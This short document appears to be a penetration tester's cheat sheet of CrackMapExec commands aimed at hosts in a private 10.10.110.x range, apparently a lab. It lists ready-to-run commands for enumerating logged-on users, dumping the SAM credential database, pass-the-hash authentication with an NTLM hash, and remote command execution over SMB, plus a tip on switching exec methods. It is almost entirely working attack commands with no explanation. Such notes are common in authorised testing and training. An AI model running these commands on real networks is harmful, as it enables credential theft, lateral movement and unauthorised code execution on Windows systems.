# user enum
```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

# dump sam
```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

# pth
```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

# rce
```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```


`--exec-method smbexec` standartmethod is atexec, play with this option if rce fails








